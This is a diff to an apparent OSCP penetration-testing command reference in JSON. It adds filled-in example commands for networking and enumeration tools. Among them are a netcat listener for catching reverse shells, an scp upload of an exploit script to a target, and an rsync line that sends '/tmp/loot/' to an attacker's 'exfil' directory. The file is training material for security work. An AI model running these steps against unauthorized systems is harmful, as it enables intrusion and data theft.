@@ -42,8 +42,15 @@
       "oscp_relevance": "high",
       "notes": "First test for connectivity - note Windows uses -n instead of -c",
       "prerequisites": [],
-      "alternatives": ["nmap-ping-sweep", "traceroute-host"],
-      "next_steps": ["nmap-quick-scan", "nmap-service-scan"]
+      "alternatives": [
+        "nmap-ping-sweep",
+        "traceroute-host"
+      ],
+      "next_steps": [
+        "nmap-quick-scan",
+        "nmap-service-scan"
+      ],
+      "filled_example": "ping -c 4 192.168.1.1"
     },
     {
       "id": "traceroute-host",
@@ -74,7 +81,8 @@
         "tracert-windows"
       ],
       "oscp_relevance": "medium",
-      "notes": "Useful for understanding network topology and firewall positions"
+      "notes": "Useful for understanding network topology and firewall positions",
+      "filled_example": "traceroute 192.168.1.1"
     },
     {
       "id": "tracert-windows",
@@ -104,7 +112,8 @@
       "alternatives": [
         "traceroute-host"
       ],
-      "oscp_relevance": "medium"
+      "oscp_relevance": "medium",
+      "filled_example": "tracert 192.168.1.1"
     },
     {
       "id": "dig-dns",
@@ -144,7 +153,8 @@
         "host-dns"
       ],
       "oscp_relevance": "high",
-      "notes": "Essential for DNS enumeration and zone transfer attempts"
+      "notes": "Essential for DNS enumeration and zone transfer attempts",
+      "filled_example": "dig example.com A"
     },
     {
       "id": "nslookup-dns",
@@ -172,7 +182,8 @@
         "host-dns"
       ],
       "oscp_relevance": "high",
-      "notes": "Cross-platform DNS tool - works on Windows and Linux"
+      "notes": "Cross-platform DNS tool - works on Windows and Linux",
+      "filled_example": "nslookup example.com"
     },
     {
       "id": "host-dns",
@@ -204,7 +215,8 @@
         "nslookup-dns"
       ],
       "oscp_relevance": "high",
-      "notes": "Simpler than dig - good for quick lookups"
+      "notes": "Simpler than dig - good for quick lookups",
+      "filled_example": "host example.com"
     },
     {
       "id": "whois-domain",
@@ -227,7 +239,8 @@
         }
       ],
       "oscp_relevance": "medium",
-      "notes": "Useful for identifying domain registrar, nameservers, contact info"
+      "notes": "Useful for identifying domain registrar, nameservers, contact info",
+      "filled_example": "whois example.com"
     },
     {
       "id": "curl-url",
@@ -266,7 +279,8 @@
         "wget-url"
       ],
       "oscp_relevance": "high",
-      "notes": "Essential for web enumeration, API testing, and file downloads"
+      "notes": "Essential for web enumeration, API testing, and file downloads",
+      "filled_example": "curl http://example.com"
     },
     {
       "id": "wget-url",
@@ -301,7 +315,8 @@
         "curl-url"
       ],
       "oscp_relevance": "high",
-      "notes": "Simpler than curl for basic downloads - great for transferring files to targets"
+      "notes": "Simpler than curl for basic downloads - great for transferring files to targets",
+      "filled_example": "wget http://example.com/file.txt"
     },
     {
       "id": "nc-listener",
@@ -332,8 +347,17 @@
       "oscp_relevance": "high",
       "notes": "Essential for catching reverse shells - run before triggering exploit",
       "prerequisites": [],
-      "alternatives": ["nc-listener-setup", "msf-handler-setup", "msf-handler-background"],
-      "next_steps": ["python-shell-upgrade", "linpeas-run", "winpeas-run"]
+      "alternatives": [
+        "nc-listener-setup",
+        "msf-handler-setup",
+        "msf-handler-background"
+      ],
+      "next_steps": [
+        "python-shell-upgrade",
+        "linpeas-run",
+        "winpeas-run"
+      ],
+      "filled_example": "nc -lvnp 4444"
     },
     {
       "id": "nc-connect",
@@ -368,8 +392,12 @@
       "oscp_relevance": "high",
       "notes": "Useful for manual service interaction and banner grabbing",
       "prerequisites": [],
-      "alternatives": ["telnet-connect", "curl-url"],
-      "next_steps": []
+      "alternatives": [
+        "telnet-connect",
+        "curl-url"
+      ],
+      "next_steps": [],
+      "filled_example": "nc 192.168.1.1 80"
     },
     {
       "id": "ssh-connect",
@@ -409,9 +437,18 @@
       },
       "oscp_relevance": "high",
       "notes": "Essential for accessing compromised hosts and port forwarding",
-      "prerequisites": ["hydra-ssh"],
-      "alternatives": ["evil-winrm-shell"],
-      "next_steps": ["linpeas-run", "linenum-run", "scp-file"]
+      "prerequisites": [
+        "hydra-ssh"
+      ],
+      "alternatives": [
+        "evil-winrm-shell"
+      ],
+      "next_steps": [
+        "linpeas-run",
+        "linenum-run",
+        "scp-file"
+      ],
+      "filled_example": "ssh root@192.168.1.1"
     },
     {
       "id": "scp-file",
@@ -460,7 +497,8 @@
         "rsync-files"
       ],
       "oscp_relevance": "high",
-      "notes": "Fast file transfer when SSH access is available"
+      "notes": "Fast file transfer when SSH access is available",
+      "filled_example": "scp exploit.sh root@192.168.1.1:/tmp/exploit.sh"
     },
     {
       "id": "rsync-files",
@@ -511,7 +549,8 @@
         "scp-file"
       ],
       "oscp_relevance": "medium",
-      "notes": "More efficient than scp for large transfers or syncing directories"
+      "notes": "More efficient than scp for large transfers or syncing directories",
+      "filled_example": "rsync -avz /tmp/loot/ kali@192.168.45.xxx:/home/kali/exfil/"
     },
     {
       "id": "telnet-connect",
@@ -543,7 +582,8 @@
         "nc-connect"
       ],
       "oscp_relevance": "medium",
-      "notes": "Useful for banner grabbing and manual service interaction"
+      "notes": "Useful for banner grabbing and manual service interaction",
+      "filled_example": "telnet 192.168.1.1 23"
     },
     {
       "id": "ftp-connect",
@@ -566,7 +606,8 @@
         }
       ],
       "oscp_relevance": "medium",
-      "notes": "Try anonymous login (user:\nanonymous, pass:\nanonymous@example.com)"
+      "notes": "Try anonymous login (user:\nanonymous, pass:\nanonymous@example.com)",
+      "filled_example": "ftp 192.168.1.1"
     },
     {
       "id": "nmap-udp-scan",
@@ -608,9 +649,15 @@
       ],
       "notes": "UDP scanning is slower and less reliable than TCP. Use -Pn flag to skip host discovery if needed. Common for verifying Kerberos (88/udp), DNS (53/udp), SNMP (161/udp).",
       "oscp_relevance": "high",
-      "prerequisites": ["nmap-quick-scan"],
+      "prerequisites": [
+        "nmap-quick-scan"
+      ],
       "alternatives": [],
-      "next_steps": ["nmap-service-scan", "snmp-enum"]
+      "next_steps": [
+        "nmap-service-scan",
+        "snmp-enum"
+      ],
+      "filled_example": "nmap -sU -p 88 192.168.1.10"
     }
   ]
 }
